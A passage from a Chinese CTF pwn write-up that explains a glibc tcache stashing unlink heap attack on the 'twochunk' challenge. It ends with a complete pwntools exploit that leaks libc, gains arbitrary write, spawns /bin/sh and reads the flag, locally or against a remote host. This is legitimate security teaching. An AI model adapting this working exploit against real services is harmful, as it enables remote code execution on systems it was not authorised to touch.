    Chunk 6 (in use)(0x310)  Chunk1
那么我们接下来若申请一个大小为`0x88`的`Chunk`，程序仅会检查`Chunk5`的`fd`指针是否指向`Chunk1`。
在取出`Chunk 1`后， **因为0x90的Tcache
Bin还有2个空位，程序会首先遍历发现Chunk5满足大小条件并将其作为参数调用`tcache_put`。**
    while ( tcache->counts[tc_idx] bk;
            ...
            bin->bk = bck;
            bck->fd = bin;
            tcache_put (tc_victim, tc_idx);
        }
    }
若此时，我们篡改了`Chunk 5`的`bk`指针为`Fake_Chunk`的地址(假设为0x12345678)，那么程序接下来会将`Small
bin`的`bk`指针置为`0x12345678`，并且在`0x12345678 ->
fd`的位置写入`bin`的地址，也就是`main_arena`的地址。接下来，由于 **因为0x90的Tcache
Bin仍有1个空位，程序会发现`Fake_Chunk`满足大小条件并将其作为参数调用`tcache_put`。**
此时！程序就会将我们的`Fake_Chunk`也置入`Tcache Bin`，我们只要能将其从`Tcache Bin`取回，就可以做任意地址写了。
⚠️：此处我们仍要注意一点，在将`Fake_Chunk`也置入`Tcache
Bin`之前，程序会将`bin`的地址，也就是`main_arena`的地址写入`Fake_Chunk->bk->fd`的位置，这里我们一定要确保`Fake_Chunk->bk->fd`是可写的！那么此处我们使用我们索性将buf的前部统一置为buf的位置+0x20。
那么我们对`Chunk 4`进行edit操作，注意，此处的`Chunk
4`的`index`为0。这里我们选择将chunk分配到buf的位置，以便我们能执行任意命令。
    edit(sh,0,'\x00' * 0xF0 + p64(0)+ p64(0x91) + p64(heap_address + 0x1310) + p64(0x23333000 - 0x10))
    delete(sh,1)
    creat(sh,1,0x88)
接下来我们使用`Leave_end_message`功能即可取回`Fake_chunk`。
### 泄露Libc Address & 获取Shell
首先我们先泄露Libc地址，还记得之前说过的吗，在将`Fake_Chunk`也置入`Tcache
Bin`之前，程序会将`bin`的地址，也就是`main_arena`的地址写入`Fake_Chunk->bk->fd`的位置，我们已经将`Fake_Chunk->bk`篡改为了`buf的位置+0x20`,此时，`Fake_Chunk->bk->fd`恰好为`buf的位置+0x30`，也就是message的位置！
那么我们只要使用`Show_name_message`功能即可泄露`main_arena`的地址，进而计算libc基址。
然后我们使用`Leave_end_message`功能取回`Fake_chunk`即可执行任意libc函数。
### Final Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    ​
    twochunk=ELF('./twochunk', checksec = False)
    ​
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    ​
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./twochunk")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./twochunk")
    ​
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'\x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    ​
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    ​
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    ​
    def Multi_Attack():
        # testnokill.__main__()
        return
    ​
    def creat(sh,index,chunk_size):
        sh.recvuntil('choice: ')
        sh.send('1')
        sh.recvuntil('idx: ')
        sh.send(str(index))
        sh.recvuntil('size: ')
        sh.send(str(chunk_size))
    ​
    def delete(sh,index):
        sh.recvuntil('choice: ')
        sh.send('2')
        sh.recvuntil('idx: ')
        sh.send(str(index))
    ​
    def show(sh,index):
        sh.recvuntil('choice: ')
        sh.send('3')
        sh.recvuntil('idx: ')
        sh.send(str(index))
    ​
    def edit(sh,index,value):
        sh.recvuntil('choice: ')
        sh.send('4')
        sh.recvuntil('idx: ')
        sh.send(str(index))
        sh.recvuntil('content: ')
        sh.send(value)
    ​
    def Show_name_message(sh):
        sh.recvuntil('choice: ')
        sh.send('5')
    ​
    def Leave_end_message(sh,value):
        sh.recvuntil('choice: ')
        sh.send('6')
        sh.recvuntil('leave your end message: ')
        sh.send(value)
    ​
    def Back_Door(sh):
        sh.recvuntil('choice: ')
        sh.send('7')
    ​
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            sh.recvuntil('leave your name: ')
            sh.send(p64(0x23333000 + 0x20) * 6)
            sh.recvuntil('leave your message: ')
            sh.sendline('A' * 0x30)
    ​
            creat(sh,0,233)
            delete(sh,0)
            creat(sh,0,233)
            delete(sh,0)
            creat(sh,0,23333)
            show(sh,0)
    ​
            heap_address = get_address(sh,info='We get heap address is ',address_len=8,offset=-0x260)
            sh.send('2')
            sh.recvuntil('idx: ')
            sh.send(str(0))
    ​
            # for i in range(6):
            #     creat(sh,0,0x90)
            #     delete(sh,0)
            for i in range(5):
                creat(sh,0,0x88)
                delete(sh,0)
    ​
            for i in range(7):
                creat(sh,0,0x188)
                delete(sh,0)
            creat(sh,0,0x188)
            creat(sh,1,0x300)
            delete(sh,0)
            creat(sh,0,0xF0)
            delete(sh,0)
    ​
            creat(sh,0,0x100)
            delete(sh,0)
            delete(sh,1)
    ​
            creat(sh,0,0x188)
            creat(sh,1,0x300)
            delete(sh,0)
            creat(sh,0,0xF0)
            delete(sh,1)
    ​
            creat(sh,1,0x100)
    ​
            edit(sh,0,'\x00' * 0xF0 + p64(0)+ p64(0x91) + p64(heap_address + 0x1310) + p64(0x23333000 - 0x10))
    ​
            delete(sh,1)
            creat(sh,1,0x88)
    ​
            Show_name_message(sh)
            libc.address = get_address(sh,info='We get libc address is ',start_string='message: ',end_string='\n',offset=-0x1E4D20)
    ​
            Leave_end_message(sh,p64(libc.symbols['system'])+p64(libc.search('/bin/sh').next()) * 10)
            Back_Door(sh)
            sh.interactive()
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    ​
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x05 参考链接
[CTF-wiki House of Lore](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/)
[HITCON CTF 2019 Quals — One Punch Man –
berming](https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312)